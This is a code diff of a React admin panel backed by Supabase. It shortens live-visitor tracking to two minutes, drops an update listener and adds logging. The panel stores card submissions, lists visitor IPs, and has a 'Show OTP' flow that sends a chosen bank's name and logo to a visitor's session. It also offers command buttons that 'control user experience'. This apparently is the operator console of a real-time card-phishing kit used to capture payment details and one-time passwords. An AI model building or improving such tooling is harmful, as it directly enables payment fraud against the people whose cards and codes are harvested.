@@ -64,22 +64,20 @@ const AdminPanel = () => {
           setCardSubmissions(submissions || []);
         }
 
-        // Load visitors
+        // Load visitors - only active ones (last 2 minutes)
+        const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
         const { data: visitorsData, error: visitorsError } = await supabase
           .from('visitors')
           .select('*')
+          .gte('created_at', twoMinutesAgo.toISOString())
           .order('created_at', { ascending: false });
 
         if (visitorsError) {
           console.error('Error loading visitors:', visitorsError);
         } else {
-          setVisitors(visitorsData || []);
-          // Only show active visitors (last 5 minutes)
-          const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
-          const currentActiveVisitors = (visitorsData || []).filter(visitor => 
-            new Date(visitor.created_at) > fiveMinutesAgo
-          );
-          setActiveVisitors(currentActiveVisitors);
+          const activeVisitorsData = visitorsData || [];
+          setVisitors(activeVisitorsData);
+          setActiveVisitors(activeVisitorsData);
         }
 
         setConnectionStatus('Connected');
@@ -139,7 +137,7 @@ const AdminPanel = () => {
       )
       .subscribe();
 
-    // Subscribe to visitors
+    // Subscribe to visitors - only show current active ones
     const visitorsChannel = supabase
       .channel('visitors')
       .on(
@@ -152,43 +150,31 @@ const AdminPanel = () => {
         (payload) => {
           console.log('New visitor:', payload.new);
           const newVisitor = payload.new as Visitor;
+          
+          // Only add if not already exists and is recent
           setVisitors(prev => {
             const exists = prev.some(v => v.ip === newVisitor.ip);
             if (!exists) {
               showNotification(`New visitor: ${newVisitor.ip}`);
-              setActiveVisitors(prevActive => [newVisitor, ...prevActive]);
-              return [newVisitor, ...prev];
+              const updatedVisitors = [newVisitor, ...prev];
+              setActiveVisitors(updatedVisitors);
+              return updatedVisitors;
             }
             return prev;
           });
         }
       )
-      .on(
-        'postgres_changes',
-        {
-          event: 'UPDATE',
-          schema: 'public',
-          table: 'visitors'
-        },
-        (payload) => {
-          console.log('Visitor updated:', payload.new);
-          const updatedVisitor = payload.new as Visitor;
-          setVisitors(prev => prev.map(visitor => 
-            visitor.id === updatedVisitor.id ? updatedVisitor : visitor
-          ));
-          setActiveVisitors(prev => prev.map(visitor => 
-            visitor.id === updatedVisitor.id ? updatedVisitor : visitor
-          ));
-        }
-      )
       .subscribe();
 
-    // Cleanup visitors after 5 minutes
+    // Cleanup old visitors every 30 seconds
     const cleanupInterval = setInterval(() => {
-      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
-      setVisitors(prev => prev.filter(visitor => new Date(visitor.created_at) > fiveMinutesAgo));
-      setActiveVisitors(prev => prev.filter(visitor => new Date(visitor.created_at) > fiveMinutesAgo));
-    }, 60000);
+      const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
+      setVisitors(prev => {
+        const filtered = prev.filter(visitor => new Date(visitor.created_at) > twoMinutesAgo);
+        setActiveVisitors(filtered);
+        return filtered;
+      });
+    }, 30000);
 
     return () => {
       supabase.removeChannel(submissionsChannel);
@@ -242,7 +228,7 @@ const AdminPanel = () => {
   const deleteAllTransactions = async () => {
     if (window.confirm('Are you sure you want to delete all transactions? This action cannot be undone.')) {
       try {
-        // Delete from Supabase database
+        // Delete from Supabase database first
         const { error } = await supabase
           .from('card_submissions')
           .delete()
@@ -252,7 +238,7 @@ const AdminPanel = () => {
           console.error('Error deleting transactions from database:', error);
           showNotification('Error deleting transactions from database');
         } else {
-          // Clear local state
+          // Clear local state after successful database deletion
           setCardSubmissions([]);
           showNotification('All transactions deleted successfully');
           console.log('All transactions deleted from database and admin panel');
@@ -265,12 +251,16 @@ const AdminPanel = () => {
   };
 
   const handleShowOtp = (submissionId: string) => {
+    console.log('Show OTP clicked for submission:', submissionId);
     setSelectedSubmissionId(submissionId);
     setShowBankModal(true);
   };
 
   const handleBankSelect = (bankName: string, bankLogo: string) => {
+    console.log('Bank selected:', bankName, bankLogo);
+    console.log('Sending command with submission ID:', selectedSubmissionId);
     sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
+    setShowBankModal(false);
   };
 
   return (
@@ -317,16 +307,16 @@ const AdminPanel = () => {
       <EnhancedVisitorInfo />
       <AdminChat />
       
-      {/* Visitors Section */}
+      {/* Current Visitors Section */}
       <div className="mb-8">
-        <h2 className="text-xl font-bold mb-4">Live Visitors ({visitors.length})</h2>
+        <h2 className="text-xl font-bold mb-4">Current Live Visitors ({activeVisitors.length})</h2>
         <div className="space-y-2">
-          {visitors.length === 0 ? (
-            <div className="text-gray-400">No visitors yet...</div>
+          {activeVisitors.length === 0 ? (
+            <div className="text-gray-400">No active visitors...</div>
           ) : (
-            visitors.map((visitor) => (
+            activeVisitors.map((visitor) => (
               <div key={visitor.id} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
-                New Visitor: {visitor.ip} - {new Date(visitor.created_at).toLocaleTimeString()}
+                Live Visitor: {visitor.ip} - {new Date(visitor.created_at).toLocaleTimeString()}
               </div>
             ))
           )}
@@ -432,7 +422,7 @@ const AdminPanel = () => {
           <li>• Use command buttons to control user experience</li>
           <li>• All transactions are saved in Supabase database</li>
           <li>• Cross-browser sessions supported via real-time subscriptions</li>
-          <li>• Visitors are automatically removed after 5 minutes of inactivity</li>
+          <li>• Visitors are automatically removed after 2 minutes of inactivity</li>
           <li>• Click the chat button to start live chat with users</li>
         </ul>
       </div>
